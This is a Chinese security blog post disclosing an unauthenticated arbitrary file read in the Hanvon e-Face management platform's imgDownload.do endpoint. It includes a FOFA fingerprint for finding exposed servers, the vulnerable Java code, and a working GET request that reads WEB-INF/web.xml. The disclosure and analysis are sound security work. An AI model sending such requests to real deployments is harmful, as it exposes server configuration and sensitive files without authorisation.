---
title: "汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-resourceUpload-imgDownload-fileread.html
asset_dir: assets/汉王e脸通综合管理平台-imgdownload.do-任意文件读取漏洞
---

# 汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/5 08:36
- 930浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

计算机安全

鉴权

软件

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `imgDownload.do` 接口存在任意文件读取漏洞。攻击者可在无需认证的情况下，通过构造恶意请求访问 `imgDownload.do` 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

漏洞预警服务

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

文件大小转换

数据库

Docker加速服务

直接看 `ResourceUploadController` 下的 `imgDownload.do` 实现方式

```
@RequestMapping(
        value = {"/imgDownload.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public void imgDownload(@RequestParam(required = true) String filePath, HttpServletRequest request, HttpServletResponse response) {
        try {
            String fullPath = PhotoStoreUtils.getCaptureDirectoryPhysicalPath() + filePath;
            FileInputStream is = new FileInputStream(fullPath);
            int i = is.available();
            byte[] data = new byte[i];
            is.read(data);
            is.close();
            response.setContentType("image/*");
            OutputStream toClient = response.getOutputStream();
            toClient.write(data);
            toClient.close();
        } catch (IOException var9) {
        }

    }
```

深入探索

Web安全书籍

SQL注入防护

漏洞扫描服务

用户可控参数 `filePath` 被直接拼接到路径上进行操作，朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞](images/img-001-1742a3809f47.webp)](https://image.mrxn.net/79d7499567844bc4b26f9211dd8f0a88.webp)

成功读取到 `web.xml` 文件

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
